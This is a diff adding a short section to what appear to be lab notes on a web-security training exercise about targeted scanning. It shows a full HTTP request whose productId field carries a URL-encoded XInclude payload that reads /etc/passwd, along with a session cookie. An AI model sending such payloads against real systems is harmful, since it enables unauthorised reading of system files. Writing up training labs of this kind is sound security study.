@@ -1,3 +1,28 @@
+## 1. Discovering vulnerabilities quickly with targeted scanning
+
+```
+POST /product/stock HTTP/2
+Host: 0a9200290378e82181399db40081001e.web-security-academy.net
+Cookie: session=RMej11L451gLhhqXoWTJ0tGgzm4Dcdkw
+Content-Length: 190
+Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
+Sec-Ch-Ua-Platform: "Windows"
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Origin: https://0a9200290378e82181399db40081001e.web-security-academy.net
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://0a9200290378e82181399db40081001e.web-security-academy.net/product?productId=4
+Accept-Encoding: gzip, deflate, br
+Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=1, i
+
+productId=%3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e&storeId=1
+```
+
 ## 2. Scanning non-standard data structures
 
 Successful payloads
